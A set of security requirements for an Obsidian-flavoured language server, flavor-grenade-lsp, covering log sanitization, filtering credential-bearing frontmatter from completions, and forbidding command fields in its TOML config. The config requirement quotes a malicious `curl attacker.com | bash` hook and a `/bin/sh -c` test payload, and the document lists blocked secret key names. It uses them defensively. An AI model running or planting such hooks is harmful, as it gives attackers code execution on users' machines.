---
title: Requirements — Information Disclosure Prevention
tags:
  - requirements/security
  - requirements/security/information-disclosure
aliases:
  - Information Disclosure Requirements
  - Privacy Requirements
---

# Information Disclosure Prevention Requirements

> [!NOTE] Scope
> These are **functional security requirements** governing how the server handles potentially sensitive vault content in logs, LSP responses, and configuration processing. Obsidian vaults regularly contain sensitive personal data — journal entries, passwords stored in frontmatter, API keys in notes, health records. These requirements prevent that data from leaking outside the user's intended context. Evidence is drawn from [[research/security-threat-model#Threat-Category-4]] and [[research/security-threat-model#Threat-Category-7]].

---

**Tag:** Security.Disclosure.LogSanitization
**Gist:** Server logs must never include vault document content; only file paths, line numbers, diagnostic codes, and error types may appear in log output.
**Ambition:** A developer enabling debug logging to troubleshoot an LSP issue should not find the contents of their personal journal or medical notes in a log file. Log files may be: shared with the project for bug reports, captured by log aggregation tools, stored in world-readable locations, or accidentally committed to version control. Any log message that includes document content (even a snippet in an error message like "Failed to parse: `---\npassword: hunter2\n---`") is a potential disclosure channel. The constraint is absolute: content never appears in logs, regardless of log level.
**Scale:** Percentage of log entries generated during a vault indexing and LSP operation session that contain any substring matching actual content from vault document files (as opposed to file paths or metadata).
**Meter:**
1. Create a test vault with known sensitive content in documents (e.g., frontmatter containing `password: test-secret-value`).
2. Run the server with maximum logging verbosity against the test vault.
3. Capture all log output.
4. Search the log output for the known sensitive string (`test-secret-value`).
5. Compute: (log entries containing document content / total log entries) × 100 — target is 0%.
**Fail:** Any log entry containing a substring from vault document content.
**Goal:** 0% of log entries contain document content — logs contain only paths, line numbers, codes, and error types.
**Stakeholders:** Vault authors, privacy-conscious users, IT security administrators.
**Owner:** flavor-grenade-lsp contributors.
**Source:** [[research/security-threat-model#Sub-threat-4.1]], general privacy best practices.

---

**Tag:** Security.Disclosure.CompletionFilter
**Gist:** Completion candidates derived from frontmatter values must not include values from sensitive key names (`password`, `token`, `secret`, `api_key`, `private_key`, `credential`, `auth`); the blocked key list must be configurable.
**Ambition:** Obsidian users sometimes store credentials in frontmatter for use with plugins (e.g., `api_key: sk-proj-XXXXX` for an AI plugin, or `password: mypassword` for an HTTP auth header in a Dataview query). The VaultIndex ingests all frontmatter values as alias candidates and completion sources. If the completion handler surfaces these values as completion candidates in `textDocument/completion`, they appear in the editor's autocomplete UI where they could be accidentally pasted, captured by screen recording, or visible over the shoulder. The blocked-key list prevents this class of values from entering the completion candidate pool at all.
**Scale:** Percentage of completion requests that return candidates derived from frontmatter values under blocked key names.
**Meter:**
1. Create a test vault document with frontmatter containing: `password: secret123`, `api_key: sk-test-abc`, `aliases: [safe-alias]`.
2. Trigger `textDocument/completion` in the context of a wiki-link (`[[`).
3. Inspect the completion candidate list.
4. Verify `secret123` and `sk-test-abc` do not appear as candidates.
5. Verify `safe-alias` does appear as a candidate (the filter must not over-block).
6. Compute: (blocked-key values not appearing in completions / total blocked-key values in vault) × 100.
**Fail:** Any completion response containing a value from a blocked frontmatter key.
**Goal:** 0% of blocked-key frontmatter values appear in completion responses; `safe-alias` from `aliases:` is not affected by the filter.
**Stakeholders:** Privacy-conscious vault authors, security-sensitive Obsidian users.
**Owner:** flavor-grenade-lsp contributors.
**Source:** [[research/security-threat-model#Sub-threat-4.2]], [[requirements/completions]], [[plans/phase-09-completions]].

---

**Tag:** Security.Config.NoCodeExecution
**Gist:** The `.flavor-grenade.toml` configuration schema must never include fields that specify commands, executables, or scripts to be run by the server; vault-provided configuration must never cause process spawning.
**Ambition:** The 2026 OpenCode vulnerability demonstrated that allowing a repository's configuration file to specify which LSP server binary to launch creates an arbitrary code execution vector. A malicious vault's `.flavor-grenade.toml` could specify a `[hooks] on_save = "curl attacker.com | bash"` field that executes arbitrary commands whenever the server processes a file save event. The fix is architectural: the server's configuration schema must simply not include any field type that represents a command, script path, or executable. This is enforced by schema validation — any TOML key in a command-execution position is rejected. If the server ever needs to run external tools, that capability must be introduced via a new ADR with explicit user-consent mechanisms (e.g., `window/showMessageRequest` prompting the user to allow execution of a specific binary).
**Scale:** Boolean — the `.flavor-grenade.toml` schema contains no fields of type "command", "executable", "script", or "shell". Verified by schema inspection and by attempting to add a command field via a crafted TOML file.
**Meter:**
1. Inspect the TOML schema definition for `.flavor-grenade.toml` in `src/`.
2. Verify no field accepts a string value intended to be executed as a command (search for field names: `command`, `cmd`, `exec`, `script`, `hook`, `run`, `shell`, `binary`, `path` in executable context).
3. Create a test `.flavor-grenade.toml` with a crafted `[hooks] on_index = "/bin/sh -c 'touch /tmp/pwned'"`.
4. Start the server against this config.
5. Verify `/tmp/pwned` is not created.
6. Verify the unknown `[hooks]` section is silently ignored (falls back to defaults).
**Fail:** Any server behaviour that executes a command, script, or external process in response to content in `.flavor-grenade.toml`.
**Goal:** 0 command-execution fields in the configuration schema; any command-like TOML content is silently ignored.
**Stakeholders:** Vault authors, security auditors, users of shared or third-party vaults.
**Owner:** flavor-grenade-lsp contributors.
**Source:** [[research/security-threat-model#Threat-Category-7]], OpenCode LSP configuration vulnerability (2026), [[adr/ADR002-ofm-only-scope]].
